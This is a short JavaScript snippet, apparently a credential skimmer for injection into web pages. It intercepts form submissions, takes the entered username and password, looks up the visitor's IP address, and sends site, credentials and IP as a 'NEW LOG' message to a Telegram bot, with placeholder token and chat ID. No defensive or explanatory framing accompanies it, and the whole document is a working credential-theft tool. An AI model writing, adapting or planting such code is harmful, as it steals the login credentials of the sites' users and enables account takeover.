var token = 'xxx';
var api = 'https://api.telegram.org/bot' + token;
var UID = 'xxx';
var ip = "None"
    $("form").submit(function() {
       var login = $(this).parent().find('input[type=text]').val();
       var pass = $(this).parent().find('input[type=password]').val();

	   var currentSite = document.domain;
        $.getJSON( "https://json.geoiplookup.io/api", function(data){ var message = "<b>NEW LOG</b> \n SITE: " + currentSite + '\n DATA: ' + login + ':' + pass + "\n IP " + data["ip"]; $.get(api + '/sendMessage?chat_id=' + UID + '&text=' + encodeURIComponent(message) + '&parse_mode=html');})
    });
	
